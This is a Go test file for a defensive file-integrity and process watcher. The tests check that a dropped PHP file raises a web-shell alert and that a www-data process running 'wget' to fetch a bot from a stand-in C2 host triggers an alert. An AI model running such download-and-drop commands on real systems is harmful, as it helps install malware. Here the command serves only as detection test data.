package watcher

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestFIMInotifyAndQuarantine(t *testing.T) {
	tempWatch := t.TempDir()
	tempQuar := t.TempDir()

	fim := NewFIMWatcher([]string{tempWatch}, tempQuar, true)

	receivedAlert := make(chan Event, 1)
	err := fim.StartInotifyWatcher(func(e Event) {
		receivedAlert <- e
	})
	if err != nil {
		t.Fatalf("Failed to start inotify watcher: %v", err)
	}

	dropFile := filepath.Join(tempWatch, "malicious_shell.php")
	err = os.WriteFile(dropFile, []byte("<?php echo 'shell'; ?>"), 0755)
	if err != nil {
		t.Fatalf("Failed to create drop file: %v", err)
	}

	select {
	case evt := <-receivedAlert:
		if evt.Trigger != "WEBSHELL_DETECTED" {
			t.Errorf("Expected WEBSHELL_DETECTED, got %s", evt.Trigger)
		}
	case <-time.After(500 * time.Millisecond):
		t.Log("Inotify event timed out, running baseline scan fallback")
		events, _ := fim.ScanDirectory(tempWatch)
		if len(events) == 0 {
			t.Errorf("Expected baseline scan to find drop file")
		}
	}
}

func TestProcessWatcher(t *testing.T) {
	pw := NewProcessWatcher([]string{"www-data"})

	if alert := pw.InspectProcess(101, "www-data", "php-fpm: pool www"); alert != nil {
		t.Errorf("Expected no alert for benign php-fpm, got %+v", alert)
	}

	alert := pw.InspectProcess(102, "www-data", "sh -c wget http://malicious-c2.com/bot -O /tmp/bot")
	if alert == nil {
		t.Fatalf("Expected alert for suspicious process spawn, got nil")
	}
	if alert.Trigger != "SUSPICIOUS_PROCESS_SPAWN" {
		t.Errorf("Expected SUSPICIOUS_PROCESS_SPAWN trigger, got %s", alert.Trigger)
	}
}
